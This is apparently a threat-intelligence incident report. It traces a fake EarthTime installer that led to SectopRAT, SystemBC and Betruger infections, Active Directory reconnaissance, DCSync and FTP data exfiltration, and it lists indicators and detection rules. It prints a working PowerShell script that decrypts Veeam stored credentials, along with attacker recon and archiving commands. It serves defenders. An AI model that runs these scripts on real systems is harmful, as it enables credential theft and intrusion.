DeskSoft\u2019s EarthTime application. This binary initiated a chain of execution leading to the deployment of SecTopRat, a .NET-based remote access trojan (RAT) with information-stealing capabilities. While investigating the connection between this malware and the legitimate software, we identified a vulnerability in the installer. Although we did not observe the threat actor exploiting this flaw, it may explain why the software was targeted. The EarthTime application has a list of resource files that it will copy into its install location. This includes the EarthTime.exe executable file. When the installer is run, before it unpacks the resources from inside the installer package, It first looks for these resources in the current directory: Meaning that if any of the files listed in the resource are found, it will copy that file instead of the one packaged in the installer. For example, we created our own Cities.txt file, and on installation, we confirmed our modified file was copied to the installed location: This behavior matches CWE-427 \u2013 Uncontrolled Search Path Element ( https://cwe.mitre.org/data/definitions/427.html ) We discovered that this vulnerability applies to all software provided by Desksoft. Execution EarthTime.exe The EarthTime.exe binary was executed from the Downloads folder. The parent process was explorer.exe, suggesting it was executed by the victim clicking on the executable. EarthTime.exe appeared to be mimicking the legitimate EarthTime application by DeskSoft. The real EarthTime is a world clock utility that lets users track multiple time zones and view astronomical data like sunrise and sunset times for different locations. It\u2019s particularly useful for business users and travelers who need to coordinate across time zones. This malicious version had been signed with a revoked certificate from \u201cBrave Pragmatic Network Technology Co., Ltd.\u201d \u2013 likely an attempt to make it look legitimate to both users and security software. Brave Pragmatic Network Technology Co., Ltd. appears to be a compromised or fraudulent certificate authority that has been observed signing multiple malware samples, with security researchers tracking various malicious executables bearing certificates from this entity. According to Cert Central lookup database , Brave Pragmatic Network Technology Co., Ltd. is a known malicious signer that has been observed signing SectopRAT samples, with certificates issued by GlobalSign GCC R45 EV CodeSigning CA 2020 and traced to China (CN). The choice to impersonate EarthTime makes sense from the threat actor\u2019s perspective, as people are generally more willing to run software they recognize. A file named \u201cEarthTime.exe\u201d is far less suspicious than something with a random or obviously malicious name, making this a classic example of social engineering through software masquerading. At the time of writing, the binary is widely recognized as malicious : EarthTime.exe spawned cmd.exe with no command line arguments. This cmd.exe process went on to spawn MSBuild.exe with the CurrentDirectory set to the user\u2019s downloads folder. MSBuild.exe is a legitimate binary signed by Microsoft, but it is unusual for it to be executed with no command-line arguments. Red Canary has previously observed this activity linked to the SecTopRAT/ArechClient2, a .NET RAT tool, which also inspired the following threat hunting query , which would detect this activity. Process chains where SecTopRat/ArechClient2 has been injected into both cmd.exe and a subsequent msbuild.exe child process have been commonly observed, such as by Red Canary and The DFIR Report . After injection, the malicious MSBuild.exe process reached out to Pastebin to retrieve its C2 configuration. MSBuild.exe communicated with 45.141.87.55 on ports 9000 and 15647. This traffic triggered the following Suricata rules: This SectopRAT IP address was also mentioned by Fox_threatintel on X/Twitter last year (2024) while also mentioning port 9000 The same IP address was listed in the IOC section of RussianPanda\u2019s blog detailing The abuse of ITarian RMM by the Dolphin Loader, a malware delivery mechanism that leverages legitimate remote management tools to deploy RATs like SectopRAT. This MSBuild.exe process then wrote the malicious executable C:\\Users\\Public\\Music\\WakeWordEngine.dll . This file write event triggered the following Sigma rules: \u2022 \u2018Suspicious Binaries and Scripts in Public Folder\u2019 \u2022 \u2018Windows Shell/Scripting Application File Write to Suspicious Folder\u2019 WakeWordEngine.dll | conhost.dll WakeWordEngine.dll is widely recognized as malicious at the time of writing. VirusTotal recognizes the file as conhost.dll : In-memory YARA scans identified the DLL as SystemBC, triggering the following signatures: Rule: ELASTIC_Windows_Trojan_Systembc_C1B58C2F Rule: EXT_MAL_SystemBC_Mar22_1 Rule: MALPEDIA_Win_Systembc_Auto Rule: TELEKOM_SECURITY_Win_Systembc_20220311 This DLL was deployed across multiple compromised servers throughout the intrusion. In most instances, it retained the same filename observed on the initial beachhead system (WakeWordEngine.dll); however, on the domain controller it was renamed to conhost.dll which corresponds to the filename identified in VirusTotal analysis. Across all infected systems, the malware was consistently staged in the C:\\Users\\Public\\Music\\ directory and executed via rundll32.exe, calling the exported function \u2018Reset\u2019. For instance, we also observe the threat actor executing the malicious DLL remotely via PsExec. WakeWordEngine.dll/conhost.dll processes were observed communicating with 149.28.101.219 over port 443. OSINT data identifies this IP address as associated with SystemBC infrastructure and shows it resolves to the following domains: Memory analysis found that once loaded in memory, the strings within the DLL show multiple items of interest, including the configured C2 IP and port, a user-agent, as well as references to PowerShell and ntdll.dll\u2019s LdrLoadDll function, which can be used for DLL loading: The full initial access and execution chain is captured below: ccs.exe On day six, MSBuild.exe wrote C:\\Users\\Public\\Music\\ccs.exe to disk. The ccs.exe binary was subsequently executed with MSBuild.exe as the parent process. Exiftool analysis revealed that the binary contained the following metadata, designed to impersonate Avast Antivirus: At the time of writing, ccs.exe is widely recognized as malicious in VirusTotal and was identified as Betruger backdoor by Symantec, a tool commonly used by RansomHub affiliates. According to Symantec\u2019s analysis , the Betruger backdoor incorporates functionality typically found across multiple pre-ransomware tools, consolidating various attack capabilities into a single executable. Betruger\u2019s comprehensive feature set includes screenshotting, keylogging, file exfiltration, network reconnaissance, privilege escalation, and credential harvesting. This extensive functionality suggests that Betruger was explicitly developed to streamline ransomware operations by reducing the number of distinct tools that need to be deployed on a compromised network during the preparation phase of an attack. Once executed, ccs.exe then injected itself into the memory of 172 distinct running processes. The call trace logged in Sysmon Process Access events shows ccs.exe injecting itself into these processes\u2019 memory: vhd.dll Lastly, we also observed another execution of a suspicious DLL (vhd.dll) dropped on the disk in the same staging folder of the threat actor. The threat actor used this PowerShell command to set the working directory to C:\\Users\\Public\\Music , a publicly writable folder where they had staged their malicious payloads. This allowed them to later execute VHD.dll via rundll32.exe without specifying a full path, simplifying execution and reducing the visibility of suspicious file paths in command-line logs. Upon execution, the vhd.dll would ask for a key, which is needed in order to fully execute the program. While checking the codes, we observed vhd.dll is a loader that asks for a key to decrypt a local file ( data.dat ) containing a hidden payload. Once decrypted, it executes the payload to ensure it only runs if the correct key is provided. Unfortunately, we were unable to fully attribute or deeply analyze the .DAT file to determine its specific purpose or associated malware family. Persistence Following the execution of the malicious binary EarthTime.exe, the threat actor leveraged the Windows Background Intelligent Transfer Service (BITS) to establish persistence through two coordinated activities. The first transfer involved copying the original executable to a new location at C:\\Users\\<REDACTED>\\AppData\\Roaming\\QuickAgent2\\ and renaming it to ChromeAlt_dbg.exe , likely to masquerade as a legitimate Chrome debugging utility. The second transfer created a shortcut file ChromeAlt_dbg.lnk and placed it in the C:\\Users\\<REDACTED>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory. Through the creation of this startup entry, the threat actor successfully established a persistence mechanism with ChromeAlt_dbg.lnk setup to execute the renamed Earthtime.exe file, ChromeAlt_dbg.exe . During the intrusion, the threat actor created a local account named \u201cAdmon\u201d with the password \u201cQwerty12345!\u201d using the legitimate binary net.exe on the beachhead host. Privilege Escalation The threat actor created a new local user account called \u201c Admon \u201d with the password \u201c Qwerty12345 !\u201d on the compromised system. They then added this newly created account to the local Administrators group, giving themselves full administrative privileges on the machine. The threat actors leveraged Microsoft Sysinternals\u2019 PsExec utility for local privilege escalation on the compromised host. By utilizing the \u201c-s\u201d parameter, the adversaries were able to execute malicious binaries with SYSTEM-level privileges, effectively escalating from their initial user-level access to the highest administrative privileges on the Windows system. Defense Evasion During the initial access malware execution a SectopRAT binary was written to %AppData%\\Local\\Temp as bhnwcwgaphpge. This was then injected into the MSBuild.exe process to run the malware. Two of the binaries observed in this attack were masquerading as products from well-known and reputable security vendors. The first binary, GT_NET.exe is associated with Grixba, a custom data-gathering tool used by the Play ransomware group. Its metadata was crafted to impersonate SentinelOne security software, complete with fake product names, descriptions, and copyright information referencing \u201cSentinel Labs, Inc.\u201d The team from Field Effect also noticed this, as per their blog back in January of this year. The second binary, ccs.exe contains the Betruger backdoor commonly deployed by RansomHub affiliates. This malware was designed with extensive metadata mimicking Avast Antivirus, including legitimate-appearing product names, version numbers, and copyright information. The threat actors even used a filename convention (\u201caswAvBootTimeScanShMin.exe\u201d) that closely resembles authentic Avast components. We also observed the threat actor attempting to disable Windows Defender\u2019s security features by modifying critical registry keys on the domain controller and backup server. Examining the registry events reveals a step-by-step approach to disable multiple Windows Defender registry keys, including real-time scanning, behavior monitoring, anti-spyware detection, and network protection. These registry changes focused on the Windows Defender policy area ( HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\ ), showing the threat actor wanted to make system-wide security changes that would last through reboots and affect all users. By targeting the policy registry instead of user-specific settings, the threat actor made sure they had maximum impact while keeping their changes in place during their attack. Lastly, the theater actor performed potentially time-stomping activities by manipulating the metadata of the ExportData.db file, which contained the scan results, by executing the \u201cGT_NET.exe\u201d binary. This timestomping occurred immediately after GT_NET.exe created the ExportData.db file, which suggests the threat actor attempts to cover its tracks by automatically changing the timestamps of its created files. The choice of a future date (2037) is particularly telling \u2013 it\u2019s far enough from the actual attack time frame to potentially throw off forensic analysis that relies on file timestamps to understand the sequence of events. Below is the sequence of events by looking at Sysmon Event ID 2. Credential Access The threat actor employed various methods to access credentials throughout this intrusion, including information stealers, Veeam database credential dumping, DCSync attacks, and the deployment of Betruger backdoor malware. Information Stealers YARA scans on memory dumps from the beachhead returned various hits for Arechclient malware (aka SectopRAT) with the following signature: Windows.Trojan.Arechclient2 SectopRAT is widely known to have information-stealing capabilities, which are on display in the strings from this particular dump. The strings reference scans for various services, including Steam, Discord, Telegram, web browsers, and crypto wallets, which is textbook infostealer activity. Veeam Database Credential Dumping Windows Event ID 4104 from the Microsoft-Windows-PowerShell/Operational log is generated by PowerShell\u2019s script block logging feature, which records the execution of PowerShell scripts. This artifact revealed that the threat actor executed a script on the backup server to extract credentials from a Veeam database. The script contains multiple sections, which have been broken down into smaller parts for better readability. The first section queries the Windows Registry for SQL Server instances and targets a hardcoded database named \u201cVeeamBackup\u201d. The $SQLQuery variable was configured to retrieve the top 1000 rows from the Credentials table within the VeeamBackup database: \"# SQL Server and database\\\\\" $hostname = hostname \"$SQLInstances = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server').InstalledInstances\" \"$SQLServer = \\\"$hostname\\\\$SQLInstances\\\" #use Server\\\\Instance for named SQL instances! \" \"$SQLDBName = \\\"VeeamBackup\\\"\" \"# SQL Query\" \"$SqlQuery = \\\"SELECT TOPdatabase (1000) [id],[user_name],[password],[usn],[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials]\\\"\" The next section of the script establishes a connection to the SQL Server database, executes the query stored in the $SQLQuery variable, stores the results in a dataset, and then closes the connection: \"# Connection string \" $SqlConnection = New-Object System.Data.SqlClient.SqlConnection \"$SqlConnection.ConnectionString = \\\"Server = $SQLServer; Database = $SQLDBName; Integrated Security = True\\\" $SqlCmd = New-Object System.Data.SqlClient.SqlCommand $SqlCmd.CommandText = $SqlQuery $SqlCmd.Connection = $SqlConnection $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter $SqlAdapter.SelectCommand = $SqlCmd $Result= New-Object System.Data.DataSet $SqlAdapter.Fill($Result) \"#Close the connection \" $SqlConnection.Close() The next section of the script was used to convert DataTable rows to PowerShell objects: $MyArray = ForEach ($Row in $Result.Tables[0].Rows) { $Record = New-Object PSObject ForEach ($Col in $Result.Tables[0].Columns.ColumnName) { Add-Member -InputObject $Record -NotePropertyName $Col -NotePropertyValue $Row.$Col } $Record } The final section of the script contains a for loop that performs the following actions: Iterates through each item in the $MyArray variable Loads the DLL Veeam.Backup.Common.dll (required to access the class needed for password decryption) Uses Veeam\u2019s ProtectedStorage class to decrypt the encoded passwords Displays usernames, decrypted passwords, and descriptions to the console for ($i = 0; $i -lt $MyArray.Length; $i++) { Add-Type -Path \"C:\\Program Files\\Veeam\\Backup and Replication\\Backup Catalog\\Veeam.Backup.Common.dll\" $encoded = $MyArray.password[$i] $pass = [Veeam.Backup.Common.ProtectedStorage]::GetLocalString($encoded) Write-Host \"==================\" Write-Host \"user_name: \" $MyArray.user_name[$i] Write-Host \"password: \" $pass Write-Host \"description:\" $MyArray.description[$i] Write-Host \"==================\" DCSync Credentials were also dumped via a DCSync attack using a privileged account. The activity was observed in Windows Security Event ID 4662, with clear indicators including a non-computer-based account, an access mask of 0x100, and the following object ID: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} = DS-Replication-Get-Changes Betruger Backdoor As outlined in the Command and Control section of this report, the file hash for the executable C:\\Users\\Public\\Music\\ccs.exe returned a direct match for the Betruger backdoor. According to research conducted by the Symantec team, this backdoor is multifunctional and includes modules designed for credential dumping. The backdoor accessed the LSASS process memory to harvest credentials, which was observed through a Sysmon process access event showing a GrantedAccess value of 0x1410 . Discovery Local system discovery The initial execution of MSBuild.exe on the beachhead led to the discovery of commands such as ipconfig , nslookup and net localgroup . Below is the illustration of the execution chain involving multiple Windows built-in commands abused by the threat actor. On day six of the intrusion, additional discovery and reconnaissance commands were executed on the compromised beachhead host. These commands were spawned as child processes of the Betruger ccs.exe process and included whoami for identity verification, net user and net group for local and domain user enumeration, nltest for domain trust relationship analysis, and ping for network connectivity testing. The cmd.exe process spawned by Betruger also wrote several suspicious hidden files indicative of discovery in the user\u2019s Downloads directory, which was also the CurrentDirectory: Network Scanning During the intrusion, the threat actor two versions of the Grixba tool. Grixba is a custom tool reportedly used by Play Ransomware that scans computer networks to find users, computers, and installed software using built-in Windows tools like WMI and WinRM. It specifically looks for security programs, antivirus software, backup tools, and office applications for reconnaissance purposes. An analysis of a Grixba sample revealed the following help message and functionality: During day two of the intrusion, the threat actor deployed the Grixba reconnaissance tool ( GT_NET.exe ) on the compromised backup server. The malware was executed through a cmd.exe parent process using the command line. GT_NET.exe -m:scan -i:f -d:list.txt Here\u2019s the command line options breakdown: -m:scan - Sets the mode/method to scan. -i:f - Input parameters set to \"f\" (file) -d:list.txt - Destination parameter pointing to list.txt. Can be used to load target IPs. GT_NET.exe generated 3,861 internal DNS queries and established 186 network connections during its execution. The majority of connections targeted destination port 135 (Microsoft RPC), with additional connections to port 389 (LDAP) and various high-numbered ephemeral ports ranging from 49666 to 63964. The creation of data.zip and ExportData.db files align with behavioral indicators documented by Field Effect\u2019s research on Grixba malware in their published analysis. Another network scanning tool used was the SoftPerfect tool netscan.exe, which was executed on the domain controller from the path C:\\Users\\Public\\Music\\123\\123\\netscan.exe and scanned ports 135 (RPC), 445 (SMB) and 3389 (RDP) across 46 IP addresses. During the netscan execution on the domain controller, we observed the creation of a file called delete.me on the C$ share of the beachhead workstation, logged by Event ID 5145. This activity has been previously observed related to netscan.exe when the \u2018Check for write access\u2019 option is enabled, as detailed in previous reports: https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware and https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours Prior to the execution of netscan.exe, we also observed the threat actors creating netscan.xml in the same directory as the executable. This file was retrieved for analysis, and inspecting its contents shows the checkwrite flag was indeed enabled: Digging into the netscan.xml config file, it\u2019s clear that the threat actors tweaked it to suit their needs, with a big focus on using PsExec to run scripts remotely. This setup enables them to deploy batch files, such as newuser.bat, openrdp.bat, and start.bat across the network. This opens the door to tasks like setting up new user accounts, enabling RDP access, and deploying additional malicious payloads. While examining the files associated with NetScan, we observed one output file with a filename matching the name of a company, potentially indicating a victim of this threat actor. Based on OSINT data, this organization has been compromised by DragonForce, as evidenced by their company profile being posted on DragonForce\u2019s data leak site (DLS). The third and final tool used for network scanning was GRB_NET.exe (another version of Grixba). This was executed on the domain controller from two different paths using different command line arguments: Upon execution, GRB_NET.exe initiated extensive network reconnaissance by generating 1,373 DNS A record queries to enumerate internal domain hosts and establishing 145 network connections. These connections primarily targeted port 135 (Microsoft RPC) and port 389 (LDAP) for service enumeration, along with ephemeral ports in the range 49666-51508. Following the reconnaissance phase, the malware created an archive file C:\\Users\\Public\\Music\\export.zip likely containing the collected data. GRB_NET.exe is unsigned and recognized as malicious by 10 vendors in VirusTotal. Active Directory Discovery On day two of the intrusion, the threat actors executed SharpHound (disguised as sh.exe ) on the domain controller from the directory C:\\PerfLogs\\ . This Active Directory reconnaissance tool was launched with the command line parameters shown below. Binary analysis confirmed the executable\u2019s metadata identifies it as a renamed SharpHound binary, which also indicates evasion tactics. When executed, sh.exe made 1,271 internal DNS A requests, as well as the following network connections, all of which triggered the Sigma rule \u2018Network Connection Initiated From Process Located In Potentially Suspicious Or Uncommon Location\u2019: sh.exe also wrote the following files, indicative of BloodHound/SharpHound execution. The writing of these files triggered the following Sigma rules: \u2018BloodHound Collection Files\u2019 \u2018Suspicious File Created in PerfLogs\u2019 \u2018Windows Shell/Scripting Application File Write to Suspicious Folder\u2019 The threat actor conducted additional Active Directory reconnaissance using the ADFind enumeration tool ( Adfind.exe ), which was staged in the C:\\Users\\Public\\Music\\ directory. The threat actor executed the command with the \u201c-subnets\u201d parameter to query the CN=Subnets,CN=Sites,CN=Configuration partition, where Active Directory stores subnet-to-site mappings and network topology information. PowerShell Script Block logging from the Domain Controller (event code 4104) shows the following Get-ADComputer command was imported and then executed to enumerate Active Directory computer objects and output them to a CSV file: Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate, ipv4address | Export-CSV C:\\Users\\Public\\Music\\AllWindows.csv -NoTypeInformation -Encoding UTF8 Other discovery commands executed on the Domain Controller and observed in the PowerShell Script Block logging include: nltest /domain_trusts /all_trusts nltest /dclist: net group \"Domain Admins\" /domain File Discovery Prior to the archiving stage, we observed the threat actor accessing the contents of multiple files using wordpad.exe , primarily on the file server as part of their discovery phase. On two occasions, the threat actor pivoted to the backup server to view and access files on the shared drives. This demonstrates the lateral movement capabilities and network discovery, which indicates the threat actor had gained extensive knowledge of the organization\u2019s infrastructure and understood how to navigate between systems to access sensitive data efficiently. One notable document sought out and opened by the threat actor was an insurance policy document covering cyber intrusions. Where zipped files were found, these were opened using WinRAR: \"C:\\Program Files\\WinRAR\\WinRAR.exe\" x -iext -ow -ver -imon1 \u2013 \"F:\\Shares\\<redacted>\\<redacted>\\<redacted>.zip\" F:\\Shares\\<redacted>\\<redacted>\\<redacted>\\ Lateral Movement The Remote Desktop Protocol (RDP) and Impacket\u2019s wmiexec were used throughout this intrusion to facilitate lateral movement. Remote Desktop Protocol The adversary primarily relied on Remote Desktop Protocol (RDP) for lateral movement throughout the compromised network. Analysis of Windows security logs revealed a consistent pattern where logon type 3 (network) events were immediately followed by logon type 10 (remote interactive) events, which is characteristic of RDP authentication sequences. This specific logon pattern was likely facilitated by SystemBC malware\u2019s proxy capabilities, which enabled the threat actor to establish RDP connections through compromised systems. Notably, the Windows security event logs disclosed the host names of the threat actor\u2019s workstations: (note the apparent typo in \u201cDESCTOP\u201d in one instance). DESCTOP-QPITRY DESKTOP-A1HRTMJ DESKTOP-PGD76HT WIN-FLGU1CC210K Impacket On day six, the threat actor used wmiexec from the Impacket suite to remotely execute various enumeration commands on the domain controller. The parent-child relationship between WmiPrvSE.exe and cmd.exe, combined with the characteristic output redirection to administrative shares, provides a clear signature of wmiexec usage. The commands executed behave as typical post-exploitation reconnaissance activities, with particular focus on enumerating specific user accounts and understanding the current user session. Betruger After the deployment of the Betruger backdoor on day six, multiple Windows Event IDs 4776 (credential validation) were observed, indicating successful network authentication attempts against the beachhead system. The source workstation associated with these authentication events WIN-FLGU1CC210K had not been observed in any previous activity during this intrusion. Based on the timing correlation with Betruger deployment and the sudden appearance of this previously unseen hostname, we assess with high confidence that this represents an additional workstation under threat actor control. Collection WinRAR.exe was brought into the victim environment for collection purposes. On day two, during a period of the threat actor\u2019s activity and under a compromised user context, explorer.exe created C:\\Users\\Public\\Music\\winrar-x64-611.exe . This binary was then executed and wrote the file C:\\Program Files\\WinRAR\\WinRAR.exe to disk. The threat actor then used WinRAR.exe to zip victim files on the file share prior to exfiltration. They systematically archived six high-value directories, before performing additional archiving operations on specific files, e.g. \"C:\\Program Files\\WinRAR\\WinRAR.exe\" a -ep1 -scul -r0 -iext -imon1 -- . F:\\Shares\\REDACTED\\REDACTED The threat actor also deployed a tool named FS64.exe , a custom tool designed for automating file collection. During execution, the threat actor specifies the drive or directory from which to collect files, and the tool outputs a .txt file containing the list of collected files. It was executed on the backup server, targeting a remotely mounted share on the file server. The process wrote the file __<redacted_fileserver_ip>_F$_Shares.txt as well as copying multiple .xls, .xlsx, .doc., .docx, .pdf files to the C:\\Users\\Public\\Music\\ directory. Winrar.exe was also used to extract WinSCP.rar in preparation for exfiltration. We also discovered a WinSCP.ini configuration file used by the WinSCP application. The threat actor utilized WinSCP to perform data exfiltration, as detailed in the Exfiltration section of this report. This WinSCP configuration reveals that the threat actor configured a custom file mask targeting a wide range of file types, including web content ( .html , .php , .js , .css ), configuration files ( .cfg , .ini , .htaccess ), and scripts/source code ( .sh , .pl , .c , .cpp ). This selective file mask indicates an intent to specifically identify and exfiltrate files containing website content, credentials, or source code rather than indiscriminately copying all available files. Command and Control Three separate Command and Control channels were observed: SectopRAT, SystemBC, and Betruger. SectopRAT The following Surricata rules triggered on the network traffic, once SectopRAT injected itself into the MSBuild.exe process for IP address 45.141.87[.]55. This IP was tracked by the DFIR Report Threat Intelligence Group as an active SectopRAT C2 server from August 8th 2024 through November 23rd 2024. The rule \u201c ET MALWARE Arechclient2 Backdoor/SecTopRAT CnC Init \u201d fired when network traffic to the destination port 15647 was detected. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 TgtIP: 45.141.87[.]55 \u00a6 TgtPort: 15647 \u00a6 Proc: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe The second rule \u201c ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity M2 (GET) (SID 2052248) \u201d fired when C2 beaconing activity to destination port 9000 was observed. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 TgtIP: 45.141.87[.]55 \u00a6 TgtPort: 9000 \u00a6 Proc: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe SystemBC Shortly after the command-and-control (C2) channel was established via the SectopRAT malware, a new file named WakeWordEngine.dll (also observed later in the intrusion named conhost.dll) was created on the beachhead host. This file was identified as the SystemBC tool, which is commonly leveraged for its proxying and tunneling capabilities. The threat actor used SystemBC to establish a tunnel, enabling Remote Desktop Protocol (RDP) access via proxy connections. This allowed them to pivot into the internal network from external systems, facilitating further post-compromise activity within the environment. The following Sigma rule triggered once the tunnel was established \u201cOutbound RDP Connections Over Non-Standard Tools\u201d. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 SrcPort: 62105 \u00a6 TgtIP: 10.65.45[.]223 \u00a6 TgtPort: 3389 \u00a6 Proc: C:\\Windows\\SysWOW64\\rundll32.exe The activity exposed the client names of the computers used by the threat actor. During the intrusion, the following client names were observed: DESKTOP-A1HRTMJ, DESKTOP-PGD76HT, DESCTOP-QPITRY (sic) and WIN-FLGU1CC210K Betruger On the fifth day of intrusion, we observed that the SectopRAT process created a new binary, ccs.exe. This particular binary has been identified as Betruger, a multi-function backdoor which appears to have been explicitly developed for carrying out ransomware attacks. This custom backdoor has been seen used by affiliates of RansomHub. Once executed, it will reach out to its command and control infrastructure, which was 504e1c95.host.njalla[.]net . Based on OSINT, the 504ec1c95.host.njalla[.]net has been classified as a phishing domain. Based on Symantec\u2019s analysis , the file was identified as the Betruger malware, a multi-functional backdoor. The malware established command and control (C2) communication over multiple IP addresses using ports 80 and 443. Exfiltration On day two of the intrusion, the threat actor began preparing for data exfiltration on the file server. The threat actor conducted systematic data archiving as part of their data staging phase before the main data exfiltration activities, as described in the Collection section of this report. Immediately after, the threat actors initiated outbound network traffic to the IP address 144.202.61.209 using WinsCP via File Transfer Protocol (FTP), efficiently exfiltrating the staged files for approximately 15 minutes. Due to the threat actor\u2019s use of the unencrypted FTP protocol rather than SFTP for data exfiltration, packet capture analysis from the file server revealed compromising evidence of the threat actor\u2019s activities in clear text, including their credentials. Based on the Wireshark capture below, the threat actor connected to an FTP server and began uploading the RAR files they created during data staging, starting with \u201cMDTM **** IT.part1.rar\u201d. The session shows them navigating directories using standard FTP commands (PWD, CWD) and switching between ASCII and binary transfer modes for optimal file transmission. The capture reveals systematic exfiltration of archived organizational data, including attempts to upload \u201cFinance.rar\u201d and other sensitive files they had previously compressed. Impact While no ransomware was deployed before the adversary was evicted from the environment, the threat actor ultimately achieved one of their primary objectives, successfully exfiltrating data from the network. Based on the actions performed by the adversary during this intrusion and the tactics, techniques, and procedures (TTPs) observed throughout the campaign, we assess with high confidence that this was an active ransomware affiliate likely working with various ransomware-as-a-service (RaaS) providers. Based on the analysis of these intrusion events, we identified multiple indicators linked to three distinct ransomware groups. The detailed attribution matrix is as follows. Observed TTPs Group Category Grixba (GT_Net.exe) Play Malware Binary Grixba (GRB_NET.exe) Play Malware Binary Payload staging under C:\\Users\\Public\\Music directory RansomHub Persistence/Staging Betruger Backdoor (ccs.exe) RansomHub Backdoor Usage of BitsAdmin RansomHub LOLBins REDACTED.xml (Netscan output file from another victim) DragonForce Discovery SystemBC (wakewordengine.dll | conhost.dll) Play + DragonForce C2/Proxy Mlaware Impacket (wmiexec) Play + RansomHub Lateral Movement / Credential AccessP NetScan, ADFind, WinRAR, WinSCP, PSExec Play + RansomHub + DragonForce Post-Exploitation Tools Timeline Diamond Model Indicators Atomic 45.141.87.55 - MSBuild.exe C2 (SectopRAT) 149.28.101.219 - WakeWordEngine.dll/conhost.dll (SystemBC) 504e1c95.host.njalla[.]net - ccs.exe (Betruger) 80.78.28.149 - ccs.exe (Betruger) 144.202.61.209 - TA's FTP server Computed earthtime.exe 71f703024c3d3bfc409f66bb61f971a0 f24fc14f39c160b54dc3b2fbd1eba605ec0eb04f bcff246f0739ed98f8aa615d256e7e00bc1cb24c8cabaea609b25c3f050c7805 wakewordengine.dll / conhost.dll e963d598a86c5ee428a2eefa34d1ffbb 142294249feb536e0edbe6e2de3eb3c3415ecf39 6f9326224e6047458e692cd27aeb1054b9381c67aaf2fe238dbebfbc916c4b33 ccs.exe (Betruger) 5675a7773f6d3224bfefdc01745f8411 c0e5e4b5fcbd0a30b042e602d99a6ee81ad5d8d7 ae7c31d4547dd293ba3fd3982b715c65d731ee07a9c1cc402234d8705c01dfca fs64.exe c6f92d1801d7d212282a6dd8f11b44fe d15d45d9d9a8ef7a9f048d74b386f620f3b82576 e1521e077079032df974c7ae39e4737cdb4f05c6ded677ed5446167466eeb899 vhd.dll 95c96de7dcb5a643559ac66045559cc9 68b6d0cc1430e2d4f70e2ba5026d1c4847324269 a4bc6bebabb52ed9816987b77ebae6ef70e174533a643aea6265bdf1ed9b8952 gt_net.exe abb2a6a0f771ab20ce2037d2c4ef5783 ac0fcbc148e45e172c9be0acf9c307186f898803 aeaf7cc7364a44b381af9f317fe6f78c2717217800b93bee8839ab3e56233254 grb_net.exe 88df27b6e794e3fd5f93f28b1ca1d3d0 2114d655805f465d11b720830d150c145039bcd4 f8810179ab033a9b79cd7006c1a74fbcde6ed0451c92fbb8c7ce15b52499353a adfind.exe 12011c44955fd6631113f68a99447515 4f4f8cf0f9b47d0ad95d159201fe7e72fbc8448d c92c158d7c37fea795114fa6491fe5f145ad2f8c08776b18ae79db811e8e36a3 sh.exe 829a9dfd2cdcf50519a1cec1f529854b 5bf41754bfb3a18611b2a02f7f385960ed24f8e1 a7240d8a7aee872c08b915a58976a1ddee2ff5a8a679f78ec1c7cf528f40deed netscan.exe 27f7186499bc8d10e51d17d3d6697bc5 52332ce16ee0c393b8eea6e71863ad41e3caeafd 18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66b3c7ee3b6fc37d3566 Detections Network ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity M2 (GET) ET MALWARE Arechclient2 Backdoor/SecTopRAT CnC Init ThreatFox SectopRAT botnet C2 traffic (ip:port - confidence level: 100%) ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity ET INFO Suspected Impacket WMIExec Activity Sigma Search rules on detection.fyi or sigmasearchengine.com DFIR Private Rules: 85d1ebcc-0145-4033-a344-f9f3a4dd03ac : Sharphound File Writes 932dd739-3672-458e-b362-b3cedba992ba : Grixba Reconnaissance Tool Execution 97350071-6934-4d1e-863d-23b7f51fb17d : SharpHound Active Directory Enumeration Tool Execution Sigma Repo: 17d619c1-e020-4347-957e-1d1207455c93 : Active Directory Replication from Non Machine Account b85e5894-9b19-4d86-8c87-a2f3b81f0521 : BITS Transfer Job Downloading File Potential Suspicious Extension 6d44fb93-e7d2-475c-9d3d-54c9c1e33427 : BITS Transfer Job With Uncommon Or Suspicious Remote TLD 02773bed-83bf-469f-b7ff-e676e7d78bab : BloodHound Collection Files f376c8a7-a2d0-4ddc-aa0c-16c17236d962 : HackTool \u2013 Bloodhound/Sharphound Execution 611eab06-a145-4dfa-a295-3ccc5c20f59a : Mimikatz DC Sync 7b434893-c57d-4f41-908d-6a17bf1ae98f : Network Connection Initiated From Process Located In Potentially Suspicious Or Uncommon Location ed74fe75-7594-4b4b-ae38-e38e3fd2eb23 : Outbound RDP Connections Over Non-Standard Tools cf879ffb-793a-4753-9a14-bc8f37cc90df : Potential Qakbot Rundll32 Execution 3dfd06d2-eaf4-4532-9555-68aca59f57c4 : Process Execution From A Potentially Suspicious Folder 304afd73-55a5-4bb9-8c21-0b1fc84ea9e4 : PSEXEC Remote Execution File Artifact 7c0dcd3d-acf8-4f71-9570-f448b0034f94 : PsExec Service Child Process Execution as LOCAL SYSTEM 9a132afa-654e-11eb-ae93-0242ac130002 : PUA \u2013 AdFind Suspicious Execution b447f7de-1e53-4cbf-bfb4-f1f6d0b04e4e : Suspicious Binaries and Scripts in Public Folder bbb7e38c-0b41-4a11-b306-d2a457b7ac2b : Suspicious File Created In PerfLogs 1277f594-a7d1-4f28-a2d3-73af5cbeab43 : Windows Shell/Scripting Application File 